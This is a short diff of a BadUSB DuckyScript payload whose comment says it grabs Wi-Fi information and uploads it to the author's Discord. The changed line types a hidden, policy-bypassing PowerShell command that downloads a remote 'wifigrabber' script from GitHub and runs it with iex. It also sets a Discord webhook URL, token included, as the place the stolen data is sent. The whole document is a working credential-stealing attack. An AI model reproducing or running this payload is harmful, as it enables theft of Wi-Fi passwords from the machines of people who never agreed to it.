@@ -2,5 +2,5 @@ REM This script grabs wifi information and uploads to my Discord, do NOT run thi
 DELAY 1000
 GUI r
 DELAY 250
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Brereid98/BADUSB_Files/main/WiFi_grabber/wifigrabber.ps1?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1156889045926936596/jJZYEKagDrh_AmJRdlQsmXE8EifRf87Dj3_PMd--fcftcsk8sQbBhkOerOD2P2vUpNok';irm https://raw.githubusercontent.com/Brereid98/BADUSB_Files/main/WiFi_grabber/wifigrabber.ps1 | iex
 ENTER
